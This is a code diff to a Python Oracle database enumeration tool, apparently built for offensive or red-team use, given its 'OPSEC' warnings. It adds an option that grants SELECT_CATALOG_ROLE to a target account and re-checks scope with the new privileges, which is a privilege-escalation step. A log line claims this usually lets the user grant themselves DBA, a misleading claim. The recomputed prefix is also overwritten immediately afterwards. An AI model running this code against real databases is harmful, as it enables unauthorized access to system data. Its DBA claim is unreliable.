@@ -398,8 +398,29 @@ def handle_enumeration(creds, args):
             with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode) as conn:
                 with conn.cursor() as cur:
                     if args.grant_catalog_role:
-                        logging.warning("OPSEC: --grant-catalog-role is an audited DDL action.")
-                        # Implementation would go here
+                        logging.warning("OPSEC: --grant-catalog-role is a highly audited DDL action.")
+                        target_for_grant = (targets[0] if targets else user).upper()
+                        
+                        print(f"\n[OPSEC] Attempting to grant SELECT_CATALOG_ROLE to '{target_for_grant}'.")
+                        confirm = input(f"    > This is a DDL operation. Proceed? (y/N): ").strip().lower()
+
+                        if confirm == 'y':
+                            try:
+                                grant_sql = f"GRANT SELECT_CATALOG_ROLE TO {target_for_grant}"
+                                logging.info("Executing: %s", grant_sql)
+                                cur.execute(grant_sql)
+                                conn.commit() # DDL often auto-commits, but explicit is better
+                                logging.critical(f"Successfully granted SELECT_CATALOG_ROLE to {target_for_grant}.")
+                                logging.critical('*** This usally means you can grant yourself DBA ***')
+                                # Re-run prefix check now that we might have more privs
+                                logging.info("Re-running scope detection with new privileges...")
+                                prefix = pick_prefix(cur, "auto")
+                            except oradb.DatabaseError as e:
+                                err, = e.args
+                                logging.error("Failed to grant role: %s (Code: %s)", err.message.strip(), err.code)
+                                logging.warning("Continuing enumeration with existing privileges.")
+                        else:
+                            logging.warning("Grant operation aborted by user.")
 
                     prefix = pick_prefix(cur, args.scope)
                     if not prefix:
